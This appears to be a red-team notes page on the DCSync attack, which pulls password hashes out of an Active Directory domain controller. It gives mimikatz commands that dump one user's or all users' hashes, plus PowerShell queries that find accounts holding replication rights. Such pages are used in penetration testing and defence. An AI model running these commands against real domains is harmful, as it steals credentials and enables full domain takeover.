---
label: DCSync
---

# Credentials dump using DCSync attack

> **Requirements**:
>
> * Current user needs _DCSync_  permissions (see below) on a Domain Object granted. _Domain Admins_, _Enterprise Admins_, _Administrators_ and _Domain Controllers_ groups have the required permissions by default.
> * Access to LDAP service on DC.

A DCSync attack exploits a legitimate function of Active Directory to steal password data from Domain Controller database. The DCSync simulates the behavior of a Domain Controller and asks other DC to replicate information using the _Directory Replication Service Remote Protocol_ (MS-DRSR) and its _GetNCChanges_ function. In response a DC returns the replication data that includes password hashes. Most often, the place from which DCSync is executed is not restricted, so you just need to have the right user.

Required DCSync permissions on the Domain Object:

* Replicating Directory Changes
* Replicating Directory Changes All
* Replicating Directory Changes In Filtered Set

Windows:

> **WARNING**: It assumes that you are the user who has DCSync permissions and you have valid TGT or TGS for DC LDAP service in memory. It might be required to _become someone else_ (e.g. domain admin) using Delegation Abuse, [Pass-the-Ticket](/windows-lateral-movement/pass-the-ticket) or [RunAs](/windows-lateral-movement/access-token-manipulation) techniques.

```powershell
.\mimikatz.exe

# Get a single domain user password hash
> lsadump::dcsync /domain:$domain /user:$user

# Get all domain users password hashes
> lsadump::dcsync /domain:$domain /all
```

## Enumerate users or groups with DCSync permissions

Active Directory module:

```powershell
(Get-Acl "ad:\dc=$domain_p2,dc=$domain_p1").Access | ? {($_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" -or $_.ObjectType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" -or $_.ObjectType -eq "89e95b76-444d-4c62-991a-0facbeda640c" ) } | select IdentityReference
```

PowerView module:

```powershell
Get-ObjectACL "DC=$domain_p2,DC=$domain_p1" -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')} | select SecurityIdentifier,@{n="Identity";e={Convert-SidToName $_.SecurityIdentifier}} 
```

## References

* [Red Team Notes 2.0, _DCSync_](https://dmcxblue.gitbook.io/red-team-notes-2-0/active-directory/active-directory-attacks/dcsync)
* [Altered Security, _A primer on DCSync attack and detection_](https://www.alteredsecurity.com/post/a-primer-on-dcsync-attack-and-detection)
